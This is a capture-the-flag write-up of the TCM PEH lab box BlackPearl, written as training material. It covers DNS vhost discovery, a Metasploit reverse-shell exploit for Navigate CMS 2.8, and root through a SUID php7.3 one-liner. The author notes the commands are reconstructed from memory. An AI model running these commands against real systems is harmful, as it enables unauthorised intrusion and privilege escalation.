# BlackPearl

> **Details reconstructed from memory of my own completed walkthrough — exact commands/outputs may be paraphrased.**

**Platform:** TCM Security — Practical Ethical Hacking (PEH) Capstone  
**Difficulty:** Easy–Intermediate  
**Category:** Linux, DNS / virtual hosts, Navigate CMS, SUID privilege escalation

![OS](https://img.shields.io/badge/OS-Linux-yellow?style=flat-square&logo=linux)

![Technique](https://img.shields.io/badge/Foothold-Navigate%20CMS%20RCE-orange?style=flat-square)

![Status](https://img.shields.io/badge/Status-Educational-blue?style=flat-square)

---

## Overview

BlackPearl is a PEH Capstone box that rewards **service-aware enumeration**. The default web root looks empty (nginx welcome page), so the real application only appears after you treat **DNS** as a first-class attack surface, discover the hostname **`blackpearl.tcm`**, add it to `/etc/hosts`, and hit the virtual host. That exposes **Navigate CMS 2.8**, which is vulnerable to unauthenticated RCE. Privilege escalation is a clean GTFOBins win: **`php7.3` is SUID**, so one one-liner drops you to root.

It reinforced a habit I still use: when HTTP looks boring, re-check DNS, vhosts, and name-based routing before moving on.

---

## Reconnaissance

I started with a service scan:

```bash
nmap -sC -sV -p- -oN blackpearl-full.txt <target-ip>
```

Open ports that mattered:

| Port | Service | Notes |
|------|---------|--------|
| **22/tcp** | OpenSSH | later access option once you have a shell/creds |
| **53/tcp** | ISC BIND DNS | hostname discovery |
| **80/tcp** | nginx | default welcome page at the raw IP |

### Web by IP

Browsing `http://<target-ip>/` showed the stock nginx page. Directory busting against the IP found little of value (e.g. a `/secret` download that did not unlock the box). That was the signal to stop treating port 80 as “done” and pivot to **DNS**.

### DNS enumeration → hostname

```bash
dnsrecon -r 127.0.0.0/24 -n <target-ip> -d test
```

The reverse lookup returned **`blackpearl.tcm`**. I mapped it locally:

```bash
echo "<target-ip>  blackpearl.tcm" | sudo tee -a /etc/hosts
```

### Virtual host enumeration

`http://blackpearl.tcm` served a different site (PHP / `phpinfo`-style page), confirming name-based vhosting.

```bash
gobuster dir -u http://blackpearl.tcm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Key find: **`/navigate/`** → **Navigate CMS v2.8**.

---

## Exploitation — Navigate CMS unauthenticated RCE

Public research on Navigate CMS 2.8 points to a known unauthenticated RCE chain (auth bypass + unsafe upload / path handling). The reliable lab path is the Metasploit module:

```bash
msfconsole -q
use exploit/multi/http/navigate_cms_rce
set RHOSTS <target-ip>
set VHOST blackpearl.tcm
set LHOST <your-ip>
set LPORT 4444
run
```

On success I received a **Meterpreter / shell** as the web user (`www-data`). I stabilized the shell for local enum:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl-Z → stty raw -echo; fg
```

---

## Privilege Escalation — SUID `php7.3`

Local enumeration (manual + LinPEAS-style checks) highlighted a misconfigured SUID binary:

```bash
find / -perm -4000 -type f 2>/dev/null
# → /usr/bin/php7.3
ls -la /usr/bin/php7.3
```

GTFOBins documents escalating via PHP when the binary is SUID. I ran:

```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

That spawned a shell retaining elevated privileges (`-p`). Confirmed:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

Root proof captured from `/root` (and any user flags under `/home` as required by the lab).

---

## Proof & Loot

```bash
id
whoami
cat /root/* 2>/dev/null
hostname
```

---

## Lessons Learned

BlackPearl is a textbook reminder that **the interesting web app may not answer on the IP**. nginx + BIND together often mean a hostname-gated site.

Key takeaways:

- **Enumerate DNS early** when port 53 is open — `dnsrecon` / PTR lookups can unlock the real vhost.
- Always update **`/etc/hosts`** and re-run content discovery against the hostname, not only the IP.
- **Versioned CMS installs** (Navigate 2.8) are high-value for known RCE research / Metasploit modules — after you confirm the version.
- **SUID interpreters** (`php`, `python`, `perl`, …) are classic GTFOBins privesc; `find / -perm -4000` should be reflexive after foothold.

This box pairs well with my other TCM writeups ([Academy](academy.md), [Dev](dev.md)): same end-to-end methodology, different service pivot (DNS/vhost instead of FTP or NFS).
